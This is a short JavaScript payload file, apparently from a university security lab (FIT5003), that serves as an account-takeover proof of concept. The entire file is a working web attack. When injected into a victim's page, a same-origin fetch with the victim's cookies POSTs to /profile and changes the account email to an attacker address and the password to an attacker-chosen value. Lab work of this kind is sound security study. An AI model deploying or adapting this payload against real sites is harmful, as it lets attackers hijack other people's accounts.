// payload.js — B.2 account-takeover PoC (FIT5003 35710993, lab use only)
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  credentials: 'same-origin',
  body: 'email=attacker-35710993@evil.local&password=hacked-35710993'
});
